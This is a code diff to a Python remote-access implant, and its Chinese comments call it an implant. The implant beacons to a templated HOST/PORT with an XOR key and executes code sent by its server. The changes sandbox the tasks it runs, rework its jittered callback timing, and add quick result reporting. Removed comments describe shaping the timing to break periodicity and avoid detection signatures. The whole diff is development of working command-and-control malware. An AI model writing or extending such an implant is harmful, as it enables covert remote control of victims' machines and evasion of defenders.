@@ -1,4 +1,23 @@
-import socket as sock, struct as st, zlib as zl, random as rnd, time as tm, json as js, sys as sy, traceback as tb, io as io_, secrets as sec, threading as thr, hashlib as hl, hmac as hmac_
+import socket as sock, struct as st, zlib as zl, random as rnd, time as tm, json as js, sys as sy, traceback as tb, io as io_, os as _osx, threading as thr, hashlib as hl, hmac as hmac_
+
+# `secrets` 是 Python 3.6+ 模块, 而目标机常见 3.5 → 这里用 os.urandom 提供等价接口
+# (token_bytes/token_hex/randbelow/choice), 调用点(sec.xxx)保持原样。
+class _Sec:
+    token_bytes = staticmethod(_osx.urandom)
+
+    @staticmethod
+    def token_hex(n=32):
+        return _osx.urandom(n).hex()
+
+    @staticmethod
+    def randbelow(n):
+        return int.from_bytes(_osx.urandom(16), "big") % n
+
+    @staticmethod
+    def choice(seq):
+        return seq[int.from_bytes(_osx.urandom(16), "big") % len(seq)]
+
+sec = _Sec()
 
 MASTER_KEY = bytes({{XOR_KEY_BYTES}})
 HOST = "{{HOST}}"
@@ -20,8 +39,8 @@ _P = PORT                 # server 端口(set_host 模块修改,connect_transpor
 _K = MASTER_KEY           # 部署密钥(set_host 模块 key 参数修改)
 _CK = MASTER_KEY          # 当前连接密钥(uplevel _disp 按通道层切换;cycle 每轮 CONN_KEY=_CK)
 _B = BREAK_FLAG           # break 标志(主循环检查 _B)
-# 回连间隔/抖动用 globals() 字符串键存储: set_interval 模块与 sleep_jitter
-# 各自 minify 后短名不一致, 字符串键 "_I"/"_J" 不受压缩影响(跨文件唯一通道)
+# 回连间隔/抖动用 globals() 字符串键存储: 任务代码跑在**专用命名空间**里,
+# 只有字符串键(与 _glb_API)能跨文件写回植入物状态(set_interval 模块写 _I/_J)
 globals()["_I"] = INTERVAL
 globals()["_J"] = JITTER
 
@@ -143,6 +162,86 @@ _ACTIVE_LOCK = thr.Lock()
 _RECORDS = {}        # task_id -> {"output","error","ts"}(record 型任务: 只记录不上报)
 _RECORDS_LOCK = thr.Lock()
 
+# ── 任务执行隔离(D3): 下发代码不再与植入物共享命名空间 ──
+# 每个任务拿到自己的一份 globals(浅拷贝)+ 显式接口 _glb_API。这样任务里
+# `f=1`、`with open(...) as f:` 这类手写变量名再也顶不掉植入物运行时(此前
+# 会覆盖植入物的模块/函数名, 下一步睡眠/收发就崩, 2026-09-28)。
+# _glb_API 是植入物全局的"写穿透"视图: 读实时值、写直达植入物 → set_interval/
+# sleep/shell/set_host 这些"改状态"的既有玩法一字不变; 任务里 globals() 也
+# 指向 _glb_API(老写法 globals()["_I"]=30 继续生效)。任务私有变量只留在
+# 自己那份拷贝里, 任务之间也不再互相污染。
+_DENY_WRITE = ("_TLS", "_PENDING", "_PENDING_LOCK", "_KNOWN", "_KNOWN_LOCK",
+               "_ACTIVE", "_ACTIVE_LOCK", "_RECORDS", "_RECORDS_LOCK", "_API")
+
+
+class _ApiProxy:
+    """任务代码读写植入物全局的统一入口(_glb_API)。"""
+
+    __slots__ = ("_g",)
+
+    def __init__(self, g):
+        self._g = g
+
+    def __getitem__(self, k):
+        return self._g[k]
+
+    def get(self, k, d=None):
+        return self._g.get(k, d)
+
+    def setdefault(self, k, d=None):
+        return self._g.setdefault(k, d)
+
+    def pop(self, k, *d):
+        return self._g.pop(k, *d)
+
+    def update(self, *a, **kw):
+        return self._g.update(*a, **kw)
+
+    def keys(self):
+        return self._g.keys()
+
+    def items(self):
+        return self._g.items()
+
+    def values(self):
+        return self._g.values()
+
+    def __contains__(self, k):
+        return k in self._g
+
+    def __iter__(self):
+        return iter(self._g)
+
+    def __len__(self):
+        return len(self._g)
+
+    def __setitem__(self, k, v):
+        if k in _DENY_WRITE:
+            raise KeyError("_glb_API: %r is managed by the implant, "
+                           "tasks must not write it" % (k,))
+        self._g[k] = v
+
+    def __delitem__(self, k):
+        if k in _DENY_WRITE:
+            raise KeyError("_glb_API: %r is managed by the implant, "
+                           "tasks must not delete it" % (k,))
+        del self._g[k]
+
+    def __repr__(self):
+        return "<_glb_API %d entries>" % len(self._g)
+
+
+_API = _ApiProxy(globals())
+
+
+def _task_ns():
+    """构造一个任务的执行命名空间(专用 globals, 见上面 D3 说明)。"""
+    ns = dict(globals())
+    ns["_glb_API"] = _API
+    ns["globals"] = lambda: _API     # 老写法 globals()["_I"]=30 继续穿透
+    return ns
+
+
 class _TaskCancelled(BaseException):
     """任务被 stop 命令取消的标记异常(继承 BaseException,避免被任务代码的
     except Exception 吞掉;KeyboardInterrupt 会触发解释器 SIGINT 状态污染退出码)。"""
@@ -152,7 +251,7 @@ def _run_one_task(task_id, code, record=False):
     out_buf, err_buf = io_.StringIO(), io_.StringIO()
     _TLS.buf = (out_buf, err_buf)
     try:
-        exec(code, globals())
+        exec(code, _task_ns())      # 专用命名空间: 任务代码碰不到植入物运行时
     except _TaskCancelled:
         # 被 stop 命令取消: 静默退出, 不产生结果(线程结束由 finally 清 _ACTIVE)
         return
@@ -172,6 +271,7 @@ def _run_one_task(task_id, code, record=False):
         return
     with _PENDING_LOCK:
         _PENDING[task_id] = {"output": out, "error": err}
+    _rush_sleep()   # 结果已入缓存 → 睡眠计数改小, 尽快回连上报(record 型不走这里)
 
 def spawn_task(task_id, code, record=False):
     if not task_id:
@@ -220,10 +320,62 @@ def _handle_tasks(msg):
         spawn_task(t.get("task_id", ""), code, bool(t.get("record", False)))
 
 def sleep_jitter():
-    # 回连间隔(混淆): [0.75I, 1.5I] 均匀随机,无最短下限(原 max(5,±) 有周期下界)
-    # 读 globals() 字符串键(set_interval 模块写入, minify 安全)
-    return rnd.uniform(globals().get("_I", INTERVAL) * 0.75,
-                       globals().get("_I", INTERVAL) * 1.5)
+    """回连间隔: I × uniform(1-J, 1+J),J = 构建参数 jitter(默认 0.2)。
+
+    2026-09-16:jitter 此前是**死参数**(模块里只赋值 globals()["_J"],没人读,
+    实际固定用 [0.75I, 1.5I])→ 现在真正生效,参数名实相符。
+    J 收敛到 [0, 0.9]:J>=1 会让下限 <=0(可能 0 秒狂连),负数无意义;
+    非法值(非数字)按 0 处理 = 固定间隔 I。
+    读 globals() 字符串键(set_interval 模块写 _I;模块跑在专用命名空间里,
+    字符串键是跨文件写状态的唯一通道)。
+    """
+    iv = globals().get("_I", INTERVAL)
+    try:
+        jt = min(max(float(globals().get("_J", JITTER)), 0.0), 0.9)
+    except (TypeError, ValueError):
+        jt = 0.0
+    return rnd.uniform(iv * (1.0 - jt), iv * (1.0 + jt))
+
+def _rush_sleep():
+    """结果入缓存 → 把"当前睡眠计数"临时改成 5 秒 ±20%(2026-09-16)。
+
+    · 5 秒与 ±20% 是写死的固定值, 不复用构建参数 jitter(两套节奏互不干扰);
+    · 原先还剩的正常节奏若明显更长(>6 秒, 即短间隔上限 5×1.2)则存进"下一轮
+      睡眠计数" _NXT —— 留到本次加速上报结束后接着睡, 整体节奏不被打乱;
+      剩余 ≤6 秒就不存(否则 5 秒窗口内来的第二个结果会把较长的剩余覆盖掉);
+    · 主循环每秒看一次 _SC, 所以最迟 1 秒后察觉、约 4~6 秒后回连上报。
+    """
+    try:
+        cur = float(globals().get("_SC", 0) or 0)
+    except (TypeError, ValueError):
+        cur = 0.0
+    if cur > 6.0:
+        globals()["_NXT"] = cur
+    globals()["_SC"] = 5.0 * rnd.uniform(0.8, 1.2)
+
+def _wait():
+    """睡眠: 每秒看一眼"当前睡眠计数" _SC——<=0 就返回去回连, 否则睡
+    min(1s, _SC) 再减掉(粒度 1 秒, 不做精确计时;期间结果入队会把 _SC 改小)。
+
+    _B(break 退出标志)或 _WAIT(长驻会话独占, 如 shell)置位时立即返回,
+    免得"退出/会话接管"要等一整轮睡眠才生效。
+    """
+    while True:
+        if globals().get("_B") or globals().get("_WAIT"):
+            return
+        try:
+            rem = float(globals().get("_SC", 0) or 0)
+        except (TypeError, ValueError):
+            rem = 0.0
+        if rem <= 0:
+            return
+        slice_ = 1.0 if rem > 1.0 else rem
+        tm.sleep(slice_)
+        try:
+            cur = float(globals().get("_SC", 0) or 0)
+        except (TypeError, ValueError):
+            cur = 0.0
+        globals()["_SC"] = cur - slice_
 
 def cycle():
     global CONN_KEY
@@ -276,18 +428,18 @@ def cycle():
             except Exception:
                 pass
 
-# 主循环(混淆时序): 30% 长间隔(跳 1-3 周期) + 30% 突发(1-3s 内连回),破坏周期性
-_burst_left = 0
+# 主循环(2026-09-16 睡眠模型重写;不做旧码兼容):
+#   _SC  = 当前睡眠计数(<=0 → 去回连);结果入缓存时被 _rush_sleep() 改成 5s±20%
+#   _NXT = 下一轮睡眠计数(常规随机间隔 sleep_jitter();sleep 模块下发的暂停值写这里)
+# 每轮: _wait() 睡到 _SC<=0 → cycle() 回连 → 回连结束(成功/失败统一处理)后按
+# "下一轮计数"睡并重算下一轮;若仍有结果压着(本轮新产生/未确认)则继续短间隔再报。
+# 两个变量用 globals() 字符串键(sleep 模块等跨文件写;任务在专用命名空间里跑).
+globals()["_SC"] = 0                 # 启动即回连, 第一轮不等
+globals()["_NXT"] = sleep_jitter()   # 下一轮睡眠计数(常规随机间隔)
 while True:
+    _wait()                          # 每秒看一眼 _SC;结果入队会把它改小
     if _B:
         break
-    # sleep 模块钩子: 主循环整体睡眠(暂停回连)——任务线程(_run_one_task)
-    # 照常执行, 结果暂存 _PENDING, 醒后下一轮 cycle 一并上报。
-    # 用 globals() 字符串键读写, minify 安全(变量名被压缩也不影响)。
-    _slp = globals().get("_SLP_UNTIL", 0)
-    if _slp > tm.time():
-        tm.sleep(_slp - tm.time())
-        continue
     # _WAIT 独占回连: 长驻会话类模块(shell 等)在任务线程里自行
     # register 回连并置 globals()["_WAIT"]——主循环此时必须休眠,
     # 否则双循环(普通注册与增强会话注册交替, server 端 beacon 状态
@@ -323,14 +475,15 @@ while True:
                 globals().pop("_SET_PENDING", None)
                 globals().pop("_SET_BACKUP", None)
                 globals().pop("_SET_TRY", None)
-    if _burst_left:
-        _burst_left -= 1
-        # 突发间隔 5-15s(原 1-3s 成簇短连特征太明显,拉长后仍短于主体间隔)
-        tm.sleep(rnd.uniform(5, 15))
-        continue
-    base = sleep_jitter()
-    if rnd.random() < 0.3:
-        base *= rnd.uniform(2, 4)
-    elif rnd.random() < 0.3:
-        _burst_left = rnd.randint(1, 2)
-    tm.sleep(base)
+    # 回连完成(成功/失败统一): 还有结果没报出去 → 短间隔再连一次;
+    # 都报完了 → 按"下一轮睡眠计数"睡, 同时重算下一轮(常规随机间隔)
+    with _PENDING_LOCK:
+        _has_pending = bool(_PENDING)
+    if _has_pending:
+        _rush_sleep()
+    else:
+        try:
+            globals()["_SC"] = float(globals().get("_NXT", 0) or 0)
+        except (TypeError, ValueError):
+            globals()["_SC"] = 0
+        globals()["_NXT"] = sleep_jitter()
